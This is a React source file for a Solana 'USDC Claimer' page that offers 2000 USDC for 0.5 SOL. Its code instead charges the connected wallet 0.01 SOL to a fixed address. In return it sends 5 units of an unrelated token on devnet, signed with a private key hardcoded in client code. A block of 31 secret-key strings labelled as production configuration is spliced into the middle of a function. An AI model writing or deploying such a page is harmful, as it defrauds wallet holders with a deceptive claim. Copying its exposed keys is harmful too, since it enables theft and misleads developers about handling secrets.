/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3KyYJMJ3F95v4Sk2xy5STDnvTToJpmXVNVSAC4A6bZjnwuQ6AnsMKuFpfE275KXKmnRVjkNYNejeayn5Y1JxNKkQ"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4V9LhurJF2FR4JCUwtUF8JV2uVxrEfxKmLR5mdtiKTRRdThaQEtibre9zWxd9bWKuQ2dN2T8wBdbsAr7Nqn7N4xK",
  "key1": "4BmcG244mnMcPKHkjsG14vUNZA4prXeMJbEzVBKtAW4YpPJehb8A2LhBhjeF73jxXSV8LDjU6Fg1YHtf7xisWVah",
  "key2": "2jZDyn8vvTU6PCDEjhhc38heMLLr1djs3uar6TRszKSLpmoa4D87C1pzWPf1UPaJgdfEoF8Y1CUiYryDhocYJ21W",
  "key3": "4uJDpGQEMnkDiYuM7HJA6wL1CM7ExkbEsUNiV8wsFs2UiUtxg9Wigdnrd6ALZAAwMA6yT3ghTRbMhs8YH8tojKK",
  "key4": "4moem1qr4UthiXnawmXuCMWREVUWsLizD7zrq1BmyrTeM8JG5juW61QMP6QEdr6sDCukYd2zcgyrCdCZe8eC9jde",
  "key5": "5AkDPnfPkXUgviLBqyD19tcPhPfqX8PrYWeHZY4rjPWLJWQYrENwVUKLcWxYKiENRwWsK9uneuiHE6rCb3TH1kn9",
  "key6": "4Eoa5yp3AkJqAykTAWF5U92EPYczuH34w7EdTdvmpKgfN9z5kHQ3gkNxiSy132VPcBnwep8ZeqB3SsPdPf9c22TM",
  "key7": "1HUnn5yT56Fz3Me8Wz7cUxku895t4CRakukFbRRLpoW96e4J37bynsDS8BrwkNzNsHLKUKHW5vSwNwraS8zgLdV",
  "key8": "2DGcKoia2Zn4GL5gU3svSEjvy4KfQCyJuoax2enZxZYKdhj9TnERee91881pcKjKVpevauT4okzWBhUGedDVYxVe",
  "key9": "37B6kHg9FA6GHGRhHJ2T4CmMyh3njBhZRWvMwjwspw3zDiuae5WNgvHBzqP4J6WTExxd7z6zfKbyJw8LVPzfroNG",
  "key10": "2VvKyfjjpJznFrncyEPBm6zCAZzKqw74hbmMigr1ouJR6EPe52cryrud478XQGpcM53sej4LSpNchXuq8SQc7KzD",
  "key11": "4bkHbecKdKsEfseDcskVqRmSBTmiqdBrXyd7cGA1UhNfzL7XLRoEyJJVjJCKvEo5zZZtKKwLkWEsBDab67ktXBYj",
  "key12": "46GnFkvKfTSuhs65BLudZGrrjyCRuNtu91mexF47rytKE8iffGQvFuu8Q32RjPqKKdC6oftxZvfyxkXDxTZ7Wy6d",
  "key13": "2oeXtJgvCiisYX56jWdbpHNPkVLZua4GFVKf2J8n7RwoMfM3nnrZoi6t1waJJqHjGytQPRnFevf1tDiVcUX6mgLP",
  "key14": "4Yu3C3a1rVDgvN2kzUaqNnUWGJYjMNqNmjbT5CEzRy2Ea6ewLVqyfwQsUd6JiqYs86mic7DZLhMEefVGHMdkBQHP",
  "key15": "3RNBMnQQmN5HD4E2WKfN169uuEqq3Ja4Td3hXcqJaJ8deBhd8g9ZkNZX8feGzLZBnVHiBwTkAKHENKJDzqngtTAE",
  "key16": "mkhMNoFU9MvLDfutCLghETCKBMAkS6SXuw1wwEeZrMgSZJr3GnboomVs4qUSsFzXaafoohHDF8ze58zwrsfLZgh",
  "key17": "3PJwsd2sNtTnx9avyoUWB4cYgfQYxfHYTDk8sMzftZgQhL4iNZ5KKFnw4iZzYp6kCJAHr1u9pB4btBxj4X92B7y5",
  "key18": "2ZMiD2GT9SeouzXSjqbow4uPpXqaiiPbuYRdqjFb9XLePrzwdwbMnHQqBbzPQD93gBtg8W5HdR2kTKjdfwFCgSGa",
  "key19": "5bopK9bPWN21shRuLSZiqvGpkQWbqGdjiD7AWjGtqQ19RqvEBdDQqMkrhxMFwDBvaprhvpdJGeR6cMKULBJPDbJk",
  "key20": "45ELbPAhcBg2at556D8cqAwRHgmbrAWqtCve4ghBDVxEGGpJAxk8fGkGU6SyprnC57t35HoKRRExGd54DhXQGsxd",
  "key21": "2PGixvbNMigfrcYSJLZrtC6k789bzxzopzuELu39zTDy2MrKaaQ8oHmSTVfFPLNgyZwM4qYKthuRUZvNnK4co2fB",
  "key22": "3xc1zb8UJd4WtSYmWR21zxs8J7BzSsor1jy9WCrEAcN32X39AEfDKerH6kAiHeWchoETJPpz6JxMdjFhnQ8RiWtZ",
  "key23": "23wX7vqxrD3qx518AmQDG38m8a5WCDF8Ga1qmjCr5ppw9gM1LTDDgZQa3CbXQCBWncaPw154kJsXk2Ap2hc3gJtv",
  "key24": "7N1a4BgGU7Lmy7JWJHYoSACQrDFu2usu6zVFHb15DgeK5iFY1rsFtYGc6gJwkKXs8ZjmxmRLyWB8WJpE19amGbb",
  "key25": "5qQ93bB2yUbBce9we3M5srXZ8xWxdiSNUwS782BBi1YfaUWSTXjoecNNxVAiUAr7c27Vz1TXh5Usbb1nzyiEvohA",
  "key26": "3apkknp3APRBknJiYSB25xzvvo6N9FjDHrMNCUVhewuBRLmvfs6DW7EYzELEJGobP33azbPPVmskZdhBz7qAYDk6",
  "key27": "BSVRhybACa7rD9rhT4S7mTzjbhS1hnhiqEpTVhHRe7J9EjxvAboyKpC27awJxn6bRsTdCKxKLQEqpbbj1dU7BCX",
  "key28": "4Zwgc6hErB3MUSxSdCKSNnGZvfyY5DDNyXQtGUFETfijixNNLCRXuYwRGf3EpJy27tzrwXNwqa4PAHo48EZXEnVZ",
  "key29": "2HNtPeTYa68WGDN9aH8FVJnYZ9kTGvwuJLhztPWrCoFFfpZHEaZBEqMQK2TX74kzzMjSUjEo6pavc4EANqEm4MdB",
  "key30": "buvKTTbPLUhCfJd7VvhC5o5fk9nWYGJnmjGzpzFdiiMKGEr6fDLwHhgXSPMRumYJeKTYVi2yRnGma4gq79QSmFZ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
